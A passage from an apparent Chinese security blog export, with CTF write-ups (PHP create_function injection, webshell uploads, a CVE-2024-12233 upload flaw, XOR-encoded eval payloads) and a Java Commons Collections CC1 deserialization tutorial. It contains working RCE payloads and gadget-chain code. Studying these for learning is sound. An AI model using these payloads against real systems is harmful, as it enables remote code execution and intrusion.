&#x27;f&#x27;];\n\n可以看见伪协议用不了，命令执行只有反引号可以用，跳板也不行\n我们利用双引号解析进制的特性，使用八进制绕过\nprivate $a=&#x27;create_function&#x27;;protected $b=&#x27;;&#125;&quot;\\163\\171\\163\\164\\145\\155&quot;(&quot;\\143\\141\\164\\40\\57\\146\\154\\141\\147&quot;);//&#x27;;\n\n注意我在里面又套了一层双引号，这时因为我们反序列化传递过去的是;&#125;\\163\\171\\163\\164\\145\\155(\\143\\141\\164\\40\\57\\146\\154\\141\\147);//，这个我们尝试使用双引号是可以被解析的，但是题目里面被进行了一次强制类型转换还是其他原因，导致我们被传递过去的是被单引号包裹的，于是我们就需要利用php中单引号里面的双引号也会被解析这个特性，让其被解析\n\n\n\n\n2.通配符绕过\n我们可以使用var_dump和反引号进行命令执行然后输出，但是我们继续来看waf\n$blocked_b = [&#x27;find&#x27;, &#x27;filter&#x27;, &#x27;c&#x27;, &#x27;pa&#x27;, &#x27;proc&#x27;, &#x27;dir&#x27;, &#x27;regexp&#x27;, &#x27;n&#x27;, &#x27;alter&#x27;, &#x27;load&#x27;, &#x27;grep&#x27;, &#x27;o&#x27;, &#x27;file&#x27;, &#x27;t&#x27;, &#x27;w&#x27;, &#x27;insert&#x27;, &#x27;sort&#x27;, &#x27;h&#x27;, &#x27;sy&#x27;, &#x27;\\.\\.&#x27;, &#x27;array&#x27;, &#x27;sh&#x27;, &#x27;touch&#x27;, &#x27;e&#x27;, &#x27;php&#x27;, &#x27;f&#x27;];\n\n过滤单字母这个太伤了，可以说我们无法直接调用读取命令。但是我们要知道，这些命令最后指向的其实就是一个exe文件，我们是可以使用路径访问到这个exe文件然后利用通配符访问到exe文件\nprivate $a=&#x27;create_function&#x27;;protected $b=&#x27;;&#125;var_dump(`/bi?/?a? /?lag`);//&#x27;;\n\n这个靶机的可执行文件存放在&#x2F;bin&#x2F;目录下，然后应该是通配符的原因会有一堆乱码\n\n\n\n\nflag到底在哪虽然是做出人数最多的一道题目，可以一开始我还是没写出来\n题目描述：小蓝鲨部署了一个网页项目，但是怎么403啊，好像什么爬虫什么的\n访问网站发现果然是403，然后访问robots.txt发现提示\n\n\n访问进入到一个登录界面，提示我们使用admin登录，猜到了是万能密码，但是没写出来，等到我拿着题解写出来去用蚁剑连接的时候人傻掉了\n我们在login.php中看见了我们的万能密码\n&lt;?phpsession_start();// 如果已经登录，直接跳转到 upload.phpif (isset($_SESSION[&#x27;loggedin&#x27;]) &amp;&amp; $_SESSION[&#x27;loggedin&#x27;] === true) &#123;    header(&quot;Location: upload.php&quot;);    exit;&#125;if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;    $username = $_POST[&#x27;username&#x27;] ?? &#x27;&#x27;;    $password = $_POST[&#x27;password&#x27;] ?? &#x27;&#x27;;    if ($username === &#x27;admin&#x27; &amp;&amp; strpos($password, &quot;&#x27; OR &#x27;1&#x27;=&#x27;1&quot;) !== false) &#123;        $_SESSION[&#x27;loggedin&#x27;] = true;        header(&quot;Location: /upload.php&quot;);        exit;    &#125; else &#123;        $error = &quot;❌ 用户名或密码错误&quot;;    &#125;&#125;?&gt;\n\n所谓的sql注入万能密码，原来是一个if判断，我还好奇我所有方法都试了也不行，结果合着我必须在password进行注入，而且空格和OR的大写也必须要对的上，然后就是我们直接上传Webshell了\n\n\nflag在env里面\n\n\n\n\nb@by n0t1ce b0ard这是所谓的签到题，直接把代码和漏洞的CVE给了我们，但是CVE漏洞还是要看看的\n题目描述：\n在你以后的 CTF 历程中，你会遇到不少的大型 php 项目审计。然而，大多数情况下，你不一定需要完全自己审计出一个原创的漏洞（0day），而是可以利用已有的漏洞进行攻击（nday）。CVE 是这个世界上最大的漏洞数据库。复现 CVE 是每一个 web 手不可或缺的能力。接下来，尝试用好你的 google，去复现一个已经发布的 php 项目漏洞。CVE 编号：CVE-2024-12233\n\n然后这个框架Online_notice_board算是一个小组件吧，代码量也不大在github上开源了\n漏洞在registration.php中\n&lt;?phprequire(&#x27;connection.php&#x27;);extract($_POST);if(isset($save))&#123;//check user alereay exists or not$sql=mysqli_query($conn,&quot;select * from user where email=&#x27;$e&#x27;&quot;);$r=mysqli_num_rows($sql);if($r==true)&#123;$err= &quot;&lt;font color=&#x27;red&#x27;&gt;This user already exists&lt;/font&gt;&quot;;&#125;else&#123;//dob$dob=$yy.&quot;-&quot;.$mm.&quot;-&quot;.$dd;//hobbies$hob=implode(&quot;,&quot;,$hob);//image$imageName=$_FILES[&#x27;img&#x27;][&#x27;name&#x27;];//encrypt your password$pass=md5($p);$query=&quot;insert into user values(&#x27;&#x27;,&#x27;$n&#x27;,&#x27;$e&#x27;,&#x27;$pass&#x27;,&#x27;$mob&#x27;,&#x27;$gen&#x27;,&#x27;$hob&#x27;,&#x27;$imageName&#x27;,&#x27;$dob&#x27;,now())&quot;;mysqli_query($conn,$query);//upload imagemkdir(&quot;images/$e&quot;);move_uploaded_file($_FILES[&#x27;img&#x27;][&#x27;tmp_name&#x27;],&quot;images/$e/&quot;.$_FILES[&#x27;img&#x27;][&#x27;name&#x27;]);\n\n然后那个sql语句那里我没看错的话是不是没做预处理就进行查询了，虽然没有回显那岂不是可以盲注。可惜flag不在数据库里面\n然后就是上传文件之后直接创建了一个images，关键是什么过滤都没有，我们可以直接上传php，访问路径就是images/你的email/wehshell.php\n\n\n\n\n\n\nflag？我就借走了一个文件上传的软链接的题目\n\n\n使用白名单过滤，看见可以上传压缩包然后解压，然后还可以通过文件列表去访问文件。直接猜是软链接。\nsudo ln -s /flag shell# shell指向flagtar -cf flag.tar shell# 将shell打包为 flag.tar\n\n然后把flag.tar上传后就会在文件列表中可以访问到shell\n\n\n点击即可下载我们的shell打开得到flag\nWho am I2.Misc小蓝鲨的周年礼物这个题目的考点是磁盘取证和零宽字符隐写\n我们下载附件得到一个png图片和vmdk文件，直接通过文件类型判断是磁盘取证，尝试使用TrIDNet判断文件类型发现没找到，可是vmdk这么常见的文件类型不应该啊，然后又使用DiskGenius尝试挂载发现文件错误，然后看了一下文件头和尾，也和标准的vmdk文件不同，后面才知道，这是文件加密的结果\n\n\n这个时候我们就使用VeraCrypt打开该镜像文件，VeraCrpty是一个专门用来进行磁盘加解密的软件，\n\n\n打开发现需要密码，我们猜测旁边那个png图片就是密钥文件\n\n\n点击 添加文件，选择密钥文件 nothing is here.png 后点击确定\n\n\n点击 确定 即可成功挂载\n\n\n挂载好磁盘后发现一个flag.txt文件，使用记事本打开发现和普通字符有点不同\n\n\n使用其他文本编辑器打开\n\n\n发现有很多空白字符，可以判断是零宽度字符隐写，根据这些零宽字符即可进行解码\n\n\n解码得到flag\n\n\nISCTF&#123;VC_15_s0OO0O0O_1n73r3571n6!!&#125;\n\n\n\n\n\nez_disk这次新生赛怎么同时出了好几个取证\n这次也是vmdk文件，但是这次是未加密但是vmdk文件，使用diskgenious挂载发现有一个rar文件\n\n\n下载下来发现加密了，然后查看这个vmdk文件发现提示\n\n\n提示我们下面这些字节都是有用的\n然后在末尾看见了类似jpg的文件头，看起来像被倒置了\n\n\n我们将这些字节使用010editor复制到一个新的文件中，然后使用Chef加载文件\n\n\n记得选择按照字节去翻转\n保存得到一张Jpg图片\n\n\n使用随波逐流去分析这个图片发现文件末尾有一堆文字，提取为txt文件\n\n\n属于零宽字符隐写，然后直接解码得到\n\n\n总是喜欢往一堆c里面突然塞一个d，我一个个去试都比去看快\n\n\n压缩包密码\nthis_p@ssw0rd_tha7_9ou_caN_n0t _brut3_Forc3_hhhhhhhhhhhhhhaHaa_no0b\n\n解压拿到的rar压缩包就是flag了\n湖心亭看雪Misc的签到题\n题目给了我们一张图片和一个py文件\na = b&#x27;*********&#x27; #这个东西你以后要用到b = b&#x27;blueshark&#x27; c = bytes([x ^ y for x, y in zip(a, b)])print(c.hex())#c = 53591611155a51405e\n\n给ai直接解出来a为15ctf2025，然后打开jpg文件发现文件尾后面有类似zip压缩包的内容，但是没有文件头\n\n\n那我们就自己加上去，我们在前面加上50 4B 03 04然后保存为压缩包，使用之前的密文15ctf2025，解压得到flag.txt\n\n\nflag.txt中有很多空白字符，并结合题目怀疑是snow隐写\n\n\n直接snow隐写，使用15ctf2025得到flag\n\n\n\n\n\n\n小蓝鲨的千层FLAG这个题目还是不会写，甚至写个脚本去解压压缩包都不行，自己还是太菜了\n"},{"title":"[ISITDTU_2019]EasyPHP","url":"/2025/04/27/ISITDTU-2019-EasyPHP/","content":"[ISITDTU_2019]EasyPHP&lt;?phphighlight_file(__FILE__);$_ = @$_GET[&#x27;_&#x27;];if ( preg_match(&#x27;/[\\x00- 0-9\\&#x27;&quot;`$&amp;.,|[&#123;_defgops\\x7F]+/i&#x27;, $_) )    die(&#x27;rosé will not do it&#x27;);if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )    die(&#x27;you are so close, omg&#x27;);eval($_);?&gt;\n\n简单的代码，不简单的正则，看来又有点难\nif ( preg_match(&#x27;/[\\x00- 0-9\\&#x27;&quot;`$&amp;.,|[&#123;_defgops\\x7F]+/i&#x27;, $_) )    die(&#x27;rosé will not do it&#x27;);\n\n这个匹配前ascii码表到0x20，和数字和一些字符以及x7f删除符\n以及我们的字符种类不能超过13种，我们如果直接命令执行肯定是不行的，不会这么容易，而且过滤掉的几个字母也是把命令执行锁死了\n我们这个时候就用到了取反和异或拼接了，由于对字符类型的数目有限制，我们还是取反好一点\n&lt;?phpecho urlencode(~&#x27;phpinfo&#x27;);?&gt;//%8F%97%8F%96%91%99%90\n\n我们尝试\n?_=(~%8F%97%8F%96%91%99%90)();\n\n\n\n成功了，我们可以通过phpinfo去看到哪些函数被禁用了\npcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,escapeshellarg,escapeshellcmd,passthru,proc_close,proc_get_status,proc_open,shell_exec,mail,imap_open,\n\n我们能命令执行的函数基本上都被禁用了，我们即使用取反绕过了也不能用\n仔细一看，无参rce的函数全都没被过滤，看来这是一个无参rce配合异或拼接的题目(字符太多了，取反不能用)\n但是即使是异或拼接，想要限制字符种类也是有点难的，除去必要的()^;我们还剩余9种字符，这难死了\n我有点看不懂这个代码，只能贴出来先\nresult2 = [160, 136, 138, 140, 141, 144, 145, 209, 150, 151, 154, 155, 156, 158]  # Original chars,14 totalresult = [160, 136, 141, 209, 151, 154, 155, 156]temp = []for d in result2:    for a in result:        for b in result:            for c in result:                if (a ^ b ^ c == d):                    if (a == b == c == d) or (a==b) or (b==c) or (c==d) or(a==c):                        continue                    else:                        print(&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot; % (a, b, c, d))                        if d not in temp:                            temp.append(d)print(len(temp), temp)\n\npayload\nshow_source(end(scandir(.)));=((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));\n\n\n"},{"title":"JAVA反序列化","url":"/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"JAVA反序列化漏洞不知道要干什么，感觉JAVA反序列化考的次数好少啊，但是闲着没事做啊。终于要到基础知识中最难的地方了吗，JAVA反序列化，稍微看了一下感觉要完蛋了\n1.JAVA序列化想要了解反序列化漏洞先来看下如何进行序列化\nJava序列化是指把Java对象转换为字节序列的过程；而Java反序列化是指把字节序列恢复为Java对象的过程。\n和PHP一样都是为了在网络中传递JAVA对象\n而一般实现的方法就是 serialize和unserialize。（只有实现了Serializable或者Externalizable接口的类的对象才能被序列化为字节序列。）\n然后Java反序列化的流程就是我们创建一个实现Serializable的类。然后通过ObjectOutputStream，将对象写入一个文件，然后再通过ObjectInputStream，读出这个文件进行反序列化\n先写一个需要序列化的类\nimport java.io.IOException;import java.io.ObjectInputStream;import java.io.Serializable; public class Person implements Serializable &#123;  //实现Serializable接口    private int age;    public String name;    public static int id;     public Person()&#123;    &#125;     public Person(int age, String name)&#123;        this.age = age;        this.name = name;    &#125;     @Override    public String toString() &#123;  //重写toString方法用于输出属性        return &quot;Person&#123;&quot;+                &quot;name=&#x27;&quot; + name +&#x27;\\&#x27;&#x27; +                &quot;,age=&quot; + age +                &#x27;&#125;&#x27;;    &#125; &#125;\n\n然后再将其写入文件中\n import java.io.*;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap; public class SerializationTest &#123;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;xx.bin&quot;)); //由于java不像php可以直接使用serialize，所以需要自己写一个，实际上的序列化是由ObjectOutputStream.writeObject实现的        oos.writeObject(obj);    &#125;     public static void main(String[] args) throws Exception &#123;        Person person = new Person(12,&quot;dd&quot;);        serialize(person);//主程序进行函数调用    &#125;&#125;\n\n还有就是我都快忘了Java的包的机制了，就是在同包的基础上是可以直接进行变量访问的，不同包时则需要通过import进行引入包，想了半天不知道为什么可以直接new出对象来\n然后就是读取文件进行反序列化了\nimport java.io.IOException;import java.io.ObjectInputStream;import java.io.*; public class UnserializeTest &#123;    public static Object unserialize(String Filename)throws IOException,ClassNotFoundException &#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));//先通过new FileInputStream(Filename)打开文件读取流然后再通过ObjectInputStream读取序列化数据        Object obj = ois.readObject();//进行反序列化        return obj;    &#125;    public static void main(String[] args) throws IOException,ClassNotFoundException &#123;        Person person = (Person)unserialize(&quot;ser.bin&quot;);        System.out.println(person);    &#125;&#125;\n\n于是我们反序列化的流程基本就完成了，如果是从请求头中读取序列化数据只需要getInputStream开启输入流即可\n2.漏洞产生原因之前学过PHP反序列化漏洞依赖代码，如果没有合适的魔术方法和函数等，即使不进行任何过滤也是没有办法的\nJAVA反序列化则连魔术方法也没有，理解java反序列化漏洞还是花了一点时间的\n我们知道Java中的类是以图的形式存在的，首先理解对象图 - 指的是一个对象及其所有关联对象组成的网络\n然后在进行序列化的时候会将整个图进行序列化，反序列化时相应的也会将整个图进行反序列化，这点有一点类似PHP反序列化时会将pop链上的所有对象全部进行反序列化\n在进行反序列化的时候会触发每个反序列化类的readObject方法，在进行反序列化的同时可以通过重写readObject方法实现自定义操作，有点类似PHP的__wakeup魔术方法的机制，在反序列化的时候会调用\nclass DangerousClass implements Serializable &#123;    private String data;        // 🚨 反序列化时会被自动调用！    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;        ois.defaultReadObject(); // 先执行默认反序列化        System.out.println(&quot;readObject() 被自动调用了！&quot;);        // 攻击者可以在这里插入恶意代码        Runtime.getRuntime().exec(&quot;calc.exe&quot;);    &#125;&#125;\n\n但是这个自定义的readObject和我们直接Object obj = ois.readObject();反序列化的起始操作是不同的，具体流程为\n你的代码调用 ois.readObject()    ↓JVM开始整个反序列化过程    ↓发现对象有自定义readObject()方法    ↓JVM自动调用 你的自定义readObject()    ↓在你的方法中调用 ois.defaultReadObject()   //这个默认反序化可能是为了为一些属性赋值默认值    ↓JVM恢复当前对象的基础字段    ↓继续执行你的自定义逻辑\n\n然后我们JAVA反序列化利用的就是类对readObject这个方法的重写，然后顺着利用链一直往后面找然后找到反序列化可以利用的。这个看着就好难，我也就只能通过工具及利用一下了吧\n3.CC1链我们在找链子之前需要准备好环境和源码，网上有很多方法进行源码审计，我感觉直接通过Maven和IDEA下载源码下来是最方便的\n首先随便创建一个Maven项目，然后配置pom.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;    &lt;groupId&gt;org.example&lt;/groupId&gt;    &lt;artifactId&gt;CC&lt;/artifactId&gt;    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;    &lt;properties&gt;        &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;        &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;    &lt;/properties&gt;    &lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;commons-collections&lt;/groupId&gt;            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;            &lt;version&gt;3.2.1&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;            &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;            &lt;version&gt;1.9.2&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.javassist&lt;/groupId&gt;            &lt;artifactId&gt;javassist&lt;/artifactId&gt;            &lt;version&gt;3.28.0-GA&lt;/version&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;    &lt;repositories&gt;        &lt;repository&gt;            &lt;id&gt;aliyun&lt;/id&gt;            &lt;name&gt;Aliyun Maven&lt;/name&gt;            &lt;url&gt;https://maven.aliyun.com/repository/public&lt;/url&gt;        &lt;/repository&gt;    &lt;/repositories&gt;&lt;/project&gt;\n\n使用Aliyun的镜像是因为我SSL证书有问题，只能用镜像了\n然后就是在Maven中下载源码下来\n\n\n直接右键然后下载源码和文档即可\n虽然可以通过工具直接生成对应的RCE链，但是还是要深度理解一下Java反序列化链才能使用好工具，然后根据题目进行一下微调\n1.触发点CC1链的入口就是\norg.apache.commons.collections.functors  –Commons Collections自定义的一组功能类 Transformer.class\n\n代码就是定义一个接口，接收一个对象然后哦执行transform（抽象方法，由实现接口的类去重写）返回一个对象\npackage org.apache.commons.collections;public interface Transformer &#123;    Object transform(Object var1);&#125;\n\n然后我们追踪这个接口的实现方法到\n\n\n至于为什么是这个类，我自己不知道，只能站在巨人的肩膀上看看就行了\n发现重写的transform方法\n\n\n其中 iMethodName，iParamTypes，iArgs三个参数可以通过 类InvokerTransformer公有构造函数来进行控制：\n\n\n然后我们可以实现命令执行的重点在于\nClass cls = input.getClass(); //用于获取input的类Method method = cls.getMethod(iMethodName, iParamTypes); //getMethod() 根据方法名和参数类型获取类的公共方法return method.invoke(input, iArgs);  //method.invoke() 通过反射动态调用方法\n\n 于是这个代码就通过获取类，然后根据参数和方法名获取对应的方法，然后再通过反射动态调用方法，而且参数都是由我们可以控制的，于是RCE就变得十分简单\n我们需要注意的是两个地方，一个是我们可控的实例化参数，另外一个是我们调用方法时的参数input\nimport org.apache.commons.collections.functors.InvokerTransformer;public class InvokeTransformerRCE &#123;    public static void main(String[] args) &#123;        Runtime r = Runtime.getRuntime();        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);//从左到右传递的参数分别作为方法名,参数类型,参数        invokerTransformer.transform(r);//传递input    &#125;&#125;// Class cls = input.getClass()  --&gt; Runtime.getRuntime().getClass() --&gt; cls表示Runtime类的一个对象//获取Runtime类中的exec方法// Method method = cls.getMethod(this.iMethodName, this.iParamTypes) --&gt; cls.getMethod(&quot;exec&quot;, new Class[]&#123;String.class&#125;)//进行命令执行//exec.invoke(Runtime.getRuntime(), &quot;calc&quot;) --&gt; Runtime.getRuntime().exec(&quot;calc&quot;);\n\n成功进行RCE\n\n\n\n\n2.利用链虽然我们已经可以触发RCE了，但是我们还无法直接利用，题目可不会直接让你写代码或者函数执行，我们需要的是通过反序列化触发RCE\n漏洞点在transform方法，于是我们跟进transform方法看看，发现TransformedMap.java\n\n\n我们直接来看链子中的checkSetValue方法\nprotected Object checkSetValue(Object value) &#123;    return valueTransformer.transform(value);&#125;\n\n这里调用的是valueTransformer的transform方法，我们看一下是否可控\n我们可看到在transformMap中被赋值\n\n\n但是 TransformedMap方法的属性为 protected，这导致该方法只有内部类可以进行访问调用，继续向上查找，可以看到在decorate()方法中调用了该方法，并且属性为public，valueTransformer值可控：\n\n\n于是我们就可以通过decorate方法进行赋值，然后将valueTransformer写入我们的漏洞触发类\n参数是Map（实际上是一个键值对接口），和Transformer对象的键和值，但我们只需要通过valueTransformer进行函数调用即可\n因此我们可以得到一小部分链子\ndecorate(map, null, invokeTransformer)方法 --&gt; TransformedMap()方法 --&gt; valueTransformer = invokeTransformer -&gt; checkSetValue()方法 --&gt; invokeTransformer.transform(value)\n\n\n\n现在问题就是我们该如何触发checkSetValue方法，这个方法的属性是protect，这也代表着 checkSetValue只能被内部类访问调用，这就需要查找 checkSetValue()方法在哪些地方被调用：\n\n\n我们去这个类中看看，过了几个小时我又回来了，没想到这么难看懂，Java反序列化也太难了吧，下辈子绝对不打CTF\n在找链之前，我想介绍一下困扰我很久的一个东西，键值对。在java中什么东西都是一个对象，键值对也一样。\n我们找到AbstractInputCheckedMapDecorator类中的MapEntry类，中的setValue触发了checkSetValue\n\n\n这个类构造方法需要一个实现Map.Entry(这是一个键值对接口)的类，和AbstractInputCheckedMapDecorator对象作为参数 \n由于TransformedMap继承了AbstractInputCheckedMapDecorator，所以也有MapEntry类，也就是说我们只要获取到TransformedMap的MapRntry即可通过setValue触发checkSetValue\n然后TransformedMap又继承了AbstractInputCheckedMapDecorator类(父类作为参数类型，子类可以作为参数)\npublic class TransformedMap        extends AbstractInputCheckedMapDecorator\n\n然后我们再顺着这个继承一直找下去会发现\nTransformedMap-&gt;AbstractInputCheckedMapDecorator-&gt;AbstractMapDecorator-&gt;Map\n\n就这样一直到了Map.Entry，也就是说上面的所有类都有这个接口， 直到AbstractInputCheckedMapDecorator中被实现，在MapEntry类中重写了setValue方法，调用了checkSetValue\n//代码类似interface Map.Entry&lt;K, V&gt; &#123;    // 这个接口的唯一存在意义就是表示&quot;Map中的一个键值对&quot;    K getKey();      // 必须有关键字    V getValue();    // 必须有值    V setValue(V value);&#125;\n\n\n\n至于为什么直到AbstractInputCheckedMapDecorator中被实现，主要是\nstatic class MapEntry extends AbstractMapEntryDecorator\n\n继承了AbstractMapEntryDecorator这个类，然后这个类实现了接口\n\n\n\n\n于是现在条件充足了\n\n我们可以通过TransformedMap获取到MapEntry类然后调用setValue方法\nsetValue方法中的parent我们可控，可以触发checkSetValue\n\n于是直接可以进行RCE，然后当初难到我的地方就是我们该如何获取到MapEntry，我当初一直在想为什么不可以直接transformedMap.MapEntry，而要像大佬的代码中一样调用entrySet()方法\n后面我才发现MapEntry是内部类，虽然前面没有修饰符，但是只能直接在包中被访问，而且setValue是Protect方法，也就是我们只能先通过可以直接访问到的方法去获取到MapEntry\n这里就是大佬使用的transformedMap.entrySet()了，这个可以获取到transformeMap的所有键值对对象（估计是Map的一个方法，然后不知道在哪一步被重写了）\n我们这个链子就需要的是间接触发指定的transform方法\n于是直接通过代码进行命令执行\npackage org.example;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class Main &#123;    public static void main(String[] args) &#123;        Runtime r = Runtime.getRuntime();        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);//先往对象中写入参数        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();        map.put(&quot;key&quot;, &quot;value&quot;);        //赋值--&gt;valueTransformer = invokerTransformer        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, invokerTransformer);//往transformedMap中写入参数，用于通过checkSetValue触发invokerTransformer的transformer准备好参数        //遍历Map常用格式        for(Map.Entry&lt;Object, Object&gt; entry : transformedMap.entrySet()) &#123;//entrySet()这个方法被重写后用来返回transformedMap的键值对集合，然后遍历            entry.setValue(r);//当遍历到MapEntry的时候即可通过setValue方法触发checkSetValue//虽然在transformedMap中没有MapEntry这个类，但是它的父类有，于是就继承了        &#125;    &#125;&#125;\n\n成功弹出计算器\n\n\n于是我们的第二个链子有了\n进行Map键值对遍历 --&gt; 调用 setValue()方法 --&gt; 由 setValue()方法来调用checkValue()方法\n\n\n\n\n\n于是我们接下来的目的就是去想办法通过其他方法调用transformedMap.MapEntry.setValue()这个方法，我们还是接着追踪\n这里我又卡住了，我怎么都找不到目标的那个类，后面看了一下发现是JDK的问题，就是在JDK的sun文件夹下(实际上JDK目录下是看不到的，只不过访问是在sun包下)，这些类需要通过编译的.jar文件调用，这些代码在sun包下是不能被直接实例化的，也就是这些不是直接给开发者使用的而是JDK内部调用需要，我们需要额外下载源码才能审计\n\n\n只有被编译的java文件\n\n\n我们需要下载下来源码，然后将sun文件夹放入JDK的src文件夹下\n\n\n\n\n然后我们再对setValue方法进行追踪，即可看到AnnotationInvocationHandler这个java文件了\n\n\n我们跟进AnnotationInvocationHandler.java文件，终于看到重写了readObject方法，也就意味着这条链子终于要到头了\n\n\n这个代码中我懒得去看memberType到底是什么东西，我只知道正常情况下肯定是会触发setValue的吧\n而且这个类是可序列化的\nclass AnnotationInvocationHandler implements InvocationHandler, Serializable\n\n我们可以看懂是通过memberValues调用的setValue方法，我们跟踪memberValues去看看怎么赋值\n\n\n我们可以看到是在构造方法中被赋值，但是构造方法没有声明，所以该构造方法的属性为default，只能在本包(sun.reflect.annotation)中被调用，所以利用Java反射机制来调用该构造方法并进行赋值：\n//通过名字获取AnnotationInvocationHandler类Class AnnotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);//获取AnnotationInvocationHandler类的构造方法        Constructor annotationInvocationHandlerConstructor = AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);//提升权限用于可以使用构造方法        annotationInvocationHandlerConstructor.setAccessible(true);//实例化对象，并给 memberValues赋值，使其可控        Object object = annotationInvocationHandlerConstructor.newInstance(Override.class, transformedMap);\n\n也就是说我们可以通过反射来实现对memberValues进行赋值\n3.序列化问题于是我们现在看似链子到头了，但是实际上还是有一些问题，无法实现\n1.序列化问题我们在触发反序列化漏洞的时候只能使用readObject方法，但是Runtime.getRuntime()中的Runtime是无法序列化的。\n\n\n我们之前看InvokerTransformer的时候发现，可以通过和对象作为参数，通过方法名和参数执行方法，于是我们可以直接使用反射来动态调用getRuntime\n//获取 getRuntime()方法//其中 Runtime.class -&gt; java.lang.Runtime，Runtime.class.getClass() -&gt; java.lang.Class//最终调用为 java.lang.Class.getMethod(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;).invoke(Runtime.class, &quot;getRuntime&quot;) --&gt; Runtime.class.getDeclaredMethod(&quot;getRuntime&quot;, null) --&gt; Runtime.getRuntime()Method getRuntime = (Method) new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class);//先通过反射写入动态参数，执行的方法是gerDeclared用于通过方法名和参数类型返回对应的Method对象，实际上获取的就是Runtime.getRuntime()//获取 Runtime实例Runtime runtime = (Runtime) new InvokerTransformer(                &quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getRuntime);//getRuntime写入参数之后作为runtime的参数，invoke作为方法名通过反射执行Runtime.getRuntime()返回的是Runtime实例//执行命令RCEnew InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,                new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime);//最后通过exec执行命令，也就是直接Runtime.exec()进行命令执行\n\n这个反射也是看了很久，果然以前学Java时没有学懂的东西都要在其他地方交学费\n\n\n于是Runtime这个类无法序列化的问题通过反射解决了\n但是上面的写法很多也不方便实现，毕竟反序列化的时候可不能那么嵌套操作\n可以通过调用 ChainedTransformer类中方法来实现简化。ChainedTransformer类实现了Transformer, Serializable两接口，符合条件：\npublic class ChainedTransformer implements Transformer, Serializable \n\n然后来看构造函数\npublic ChainedTransformer(Transformer[] transformers) &#123;    super();    iTransformers = transformers;&#125;\n\n将我们的数组进行赋值\n然后它还重写了transform方法，对我们传入的数组进行遍历，然后调用一次transform方法\npublic Object transform(Object object) &#123;    for (int i = 0; i &lt; iTransformers.length; i++) &#123;        object = iTransformers[i].transform(object);    &#125;    return object;&#125;\n\n于是我们就可以将上面的三次调用transform方法放入一个数组中然后遍历即可，虽然不知道代码为什么要这么写但是这的确有点巧妙\n       Transformer[] transformers = new Transformer[]&#123;               new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),               new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),               new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)       &#125;;       ChainedTransformer chainedTransformer =  new 